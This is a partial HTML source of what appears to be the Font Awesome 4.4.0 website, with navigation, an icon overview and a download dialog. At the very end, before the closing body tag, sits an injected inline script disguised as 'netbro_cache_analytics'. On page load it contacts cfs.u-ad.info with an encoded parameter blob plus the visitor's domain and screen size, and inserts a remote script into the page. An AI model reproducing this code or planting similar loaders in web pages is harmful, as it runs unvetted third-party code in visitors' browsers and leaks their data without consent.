      ...
      <ul class="nav navbar-nav">
        ...
        <li class="dropdown dropdown-split-right hidden-xs">
          ...
          <ul class="dropdown-menu pull-right">
            ...
            <li class="divider"></li>
            <li><a href="./icons/#new"><i class="fa fa-diamond fa-fw"></i>&nbsp; New Icons in 4.4</a></li>
...
<div class="container">
  ...
  <div class="row">
    <div class="col-md-4 col-sm-6">
      <h4><i class="fa fa-flag"></i> One Font, 585 Icons</h4>
...
<div class="modal fade" id="modal-download" tabindex="-1" role="dialog" aria-labelledby="modal-download-label">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      ...
      <div class="modal-footer">
        <a class="btn btn-default btn-lg block-xs" href="./assets/font-awesome-4.4.0.zip"
  ...
  <div class="container text-center">
    ...
    <div>
      <i class="fa fa-flag"></i> Font Awesome 4.4.0
  ...
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRWUKy01G%2fA1Cs7IZLGM8ReWGpA0lqmw%2f%2bWXLBpWfrpPRlEC4zBXUBxi43roX8%2fLOKlNvMNP6SeRWGccxGr918npVUcITue8GMbkIIubeAVAvnhMMOoQJkw2rx5yvQ8%2ftdnwL%2bt9rIMPHiwe7hEwTmmqtgI2IFTsJcvW%2bJjjYzTnemvtfoa7s0lUzCYNzEVZawkk6PZmD2ZKNZp3gURsindlBhtqVSCKwRKhdH0c%2blOgwThDjnDtZ3BcwgnVtHrIxhelQbBL3PI%2fqpJCC9exYd%2fzqO%2fxakcwxhp%2fqDKWrZe3S9O0zV%2b7nJmZ7Avmuv%2fo56E0H%2b9oUF84ZdtFgV8%2bey2YdlIXcLf2fUIUUx8TcOjVASrSPsgw5YWOp00WIm2xdSfaYuhSqbmHC4p2k7rIFpZ6aXoX6rRr2Kx2QYmdBHzRp%2bkSHp2gebBlH0X77vhRT1H3fe%2buz8NbSlm3QfI7h8pPKJKpdT4%2b064YAOiYDi0M1VjC2uNcBBNjQWWRIoJd2v" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
